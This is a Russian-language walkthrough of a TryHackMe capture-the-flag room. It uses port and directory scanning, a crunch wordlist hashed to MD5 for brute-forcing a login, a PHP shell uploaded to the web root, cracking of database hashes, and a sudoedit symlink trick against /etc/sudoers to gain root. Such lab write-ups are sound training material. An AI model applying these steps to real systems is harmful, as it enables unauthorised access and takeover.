# Year of the Pig

:white_check_mark:  [**Crunch**](#crunch)

:white_check_mark: [**Sqlite3**](#sqlite3)

:white_check_mark: [**Sudoedit**](#sudoedit)

:white_check_mark: [**Sudo_version**](#sudo_version)

___

## Enumeration
Сканируем ip командой:
```
nmap -sV -sV pig.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница pig.thm

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/1.png)

Переберем директории с помощью gobuster:
```
gobuster dir -u http://pig.thm -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```

```
/index.html           (Status: 200) [Size: 4801]
/login.php            (Status: 200) [Size: 2790]
/admin                (Status: 301) [Size: 302] [--> http://pig.thm/admin/]
/assets               (Status: 301) [Size: 303] [--> http://pig.thm/assets/]
/css                  (Status: 301) [Size: 300] [--> http://pig.thm/css/]   
/js                   (Status: 301) [Size: 299] [--> http://pig.thm/js/]    
/api                  (Status: 301) [Size: 300] [--> http://pig.thm/api/]
```

Перейдем на страницу **pig.thm/login.php**. Перед нами строка авторизации.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/2-1.png)

Введем случайные данные и перехватим запрос.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/2.png)

Во-первых, мы можем заметить, что наш пароль преобразуется в md5.
Во-вторых, мы не можем сбрутить пароли, т.к. всегда будем получать код ответа 200.

Но отправив запрос, на странице авторизации появляется подсказка.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/3.png)

Паролем является: памятное слово или же слово, которое легко запомнить + 2 цифры + 1 символ.

Покапавшись на странице, можно найти упоминание любимого самолета **marco - Savoia S21**.

<a name="crunch"></a>

## Crunch
Сгенерируем словарь для брута:
```
crunch 9 9 -t savoia%%^ > pass

9 9 - размер пароля от 9 до 9 символов, тоесть просто 9 символов
-t - пароль по образцу
% - любая цифра
^ - любой символ
```

Получив словарь, его нужно преобразовать в md5. Сделаем это при помощи питона.
```
import hashlib

file = open('path_to_file', 'r')
file_read = file.read()


words = list(file_read.split())

for word in words:
        hash = hashlib.md5(word.encode('utf-8')).hexdigest()
        print(hash)
```

```
python brute.py > pass_md5
```

Брутим с логином marco и словарем

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/4.png)

Находим пароль, преобразуем его обратно из md5 и логинимся.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/5.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/6.png)

Находим панель для выполнения команд. Перебрав разные варианты команд я решил, что это rabbit hole и решил попробовать эти данные для ssh и они подошли.
```
ssh marco@pig.thm
```

<a name="sqlite3"></a>

## Sqlite3
Подключивсяшь в машине и покопавшись в директории сайта, я нашел базу данных **admin.db**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/7.png)

Увы, взаимодействие с базой доступно только от пользователя www-data, поэтому закинем shell в директорию **/var/www/html**.

Запускаем слушатель и открываем shell: **http://pig.thm/shell.php**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/8.png)

Теперь, когда мы зашли под пользователем www-data, можем открыть базу данных.
```
sqlite3 admin.db
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/9.png)

Получаем пароли от юзеров. Сравнив пароль от marco с тем, который мы сбрутили, можем заметить, что они сходятся, значит пароль от curtis тоже в формате md5. Закинем его в [crackstation](https://crackstation.net/) и получим результат.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/10.png)

<a name="sudoedit"></a>
<a name="sudo_version"></a>

## Privilege escalation
Логинимся под curtis.

Просмотрим права: **sudo -l**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/11.png)

Видим, что это предположительно может быть уязвимость связанная с wildcards. Проверим версию sudo:
```
sudo --version
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/12.png)

Создадим символическую ссылку:
```
ln -s /etc/sudoers /var/www/html/assets/img/config.php

Вместо */* нужно вставить 2 существующие директории
```

У нас есть права для использования sudoedit, поэтому воспользуемся этим.
```
sudoedit /var/www/html/*/*/config.php
```

В конфигурационном файле добавим права рута пользователю curtis.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/13.png)

Выходим из файла: **Esc -> :wq**.

Получаем рута: **sudo su**.
